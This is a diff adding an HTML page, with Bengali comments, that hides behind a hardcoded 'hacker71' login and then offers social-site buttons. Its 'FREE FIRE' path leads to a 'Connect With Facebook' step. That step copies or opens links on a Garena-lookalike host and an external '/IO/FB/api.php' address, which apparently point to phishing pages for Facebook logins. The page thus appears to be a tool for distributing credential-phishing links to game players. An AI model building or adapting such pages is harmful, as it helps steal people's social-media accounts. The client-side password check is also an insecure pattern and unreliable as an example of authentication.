@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Button Navigation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #e0f7fa; /* হালকা নীল ব্যাকগ্রাউন্ড */
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        button {
+            display: block;
+            width: 250px;
+            margin: 15px auto;
+            padding: 20px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #buttonContainer, #loginBox, #linkBox, #connectFbBtn, #openBtn {
+            display: none; /* সব কিছু প্রথমে লুকানো থাকবে */
+        }
+        .link-box, .login-box, .auth-box {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            width: 300px;
+            padding: 10px;
+            border: 1px solid #007BFF;
+            border-radius: 5px;
+            margin: 15px auto;
+            background-color: white;
+        }
+        .link-box span, .login-box input, .auth-box input {
+            width: 100%;
+            margin: 5px 0;
+            padding: 10px;
+            border: 1px solid #007BFF;
+            border-radius: 5px;
+        }
+        .link {
+            overflow-wrap: break-word;
+            color: #007BFF;
+        }
+        .copy-btn {
+            cursor: pointer;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 5px;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+        .icon {
+            cursor: pointer;
+            font-size: 30px;
+            color: #007BFF;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        .input-label {
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginBox">
+        <div class="auth-box">
+            <label class="input-label" for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter Username">
+            
+            <label class="input-label" for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter Password">
+            
+            <button onclick="login()">Login</button>
+        </div>
+    </div>
+
+    <div class="container" id="buttonContainer">
+        <button onclick="goToLink('https://www.facebook.com')">FACEBOOK</button>
+        <button onclick="showConnectButton()">FREE FIRE</button>
+        <button onclick="goToLink('https://mail.google.com')">GMAIL</button>
+        <button onclick="goToLink('https://www.tiktok.com')">TIKTOK</button>
+        <button onclick="goToLink('https://www.instagram.com')">INSTAGRAM</button>
+    </div>
+
+    <!-- Connect With Facebook বাটন -->
+    <div class="container">
+        <button id="connectFbBtn" onclick="showLinkBox()">Connect With Facebook</button>
+        <button id="openBtn" style="display: none;" onclick="goToExternalLink()">Open</button>
+    </div>
+
+    <!-- লিংক বক্স -->
+    <div class="container" id="linkBox">
+        <div class="link-box">
+            <span id="randomLink" class="link">http://garrena-x-game/IO/FB/api.php?id=6187076892</span>
+            <button class="copy-btn" onclick="copyLink()">Copy</button>
+        </div>
+    </div>
+
+    <!-- মানুষের আইকন -->
+    <span class="icon" onclick="showLoginForm()" style="display: none;">&#128100;</span>
+
+    <div id="loginForm"></div>
+
+    <script>
+        // প্রথমে লগইন ফর্ম দেখাবে
+        document.getElementById('loginBox').style.display = 'block';
+
+        // লগইন করার ফাংশন
+        function login() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // ইউজারনেম এবং পাসওয়ার্ড যাচাই করা
+            if(username === 'hacker71' && password === 'Bappy') {
+                alert("Login successful!");
+                document.getElementById('loginBox').style.display = 'none'; // সফল হলে লগইন ফর্ম লুকাবে
+                document.getElementById('buttonContainer').style.display = 'block'; // বাটন কনটেইনার দেখাবে
+                document.querySelector('.icon').style.display = 'block'; // মানুষের আইকন দেখাবে
+            } else {
+                alert("Invalid username or password. Please try again.");
+            }
+        }
+
+        // লিংকে যাওয়ার ফাংশন
+        function goToLink(url) {
+            window.location.href = url;
+        }
+
+        // FREE FIRE ক্লিক করলে বাকি বাটন লুকাবে এবং কনেক্ট বাটন দেখাবে
+        function showConnectButton() {
+            document.getElementById('buttonContainer').style.display = 'none';
+            document.getElementById('connectFbBtn').style.display = 'block';
+            document.getElementById('openBtn').style.display = 'block';
+        }
+
+        // কনেক্ট উইথ ফেসবুক বাটন ক্লিক করলে লিংক বক্স দেখাবে
+        function showLinkBox() {
+            document.getElementById('linkBox').style.display = 'block';
+        }
+
+        // এক্সটার্নাল লিংকে যাওয়ার ফাংশন
+        function goToExternalLink() {
+            window.location.href = 'http://event-x.com.tr/IO/FB/api.php?id=6187076892';
+        }
+
+        // লিংক কপি করার ফাংশন
+        function copyLink() {
+            var linkText = document.getElementById("randomLink").textContent;
+            navigator.clipboard.writeText(linkText).then(() => {
+                alert("Link copied to clipboard!");
+            });
+        }
+
+        // ইনপুট বক্সের ভ্যালু কপি করার ফাংশন
+        function copyInputValue(inputId) {
+            var inputText = document.getElementById(inputId).value;
+            navigator.clipboard.writeText(inputText).then(() => {
+                alert("Copied: " + inputText);
+            });
+        }
+    </script>
+</body>
+</html>
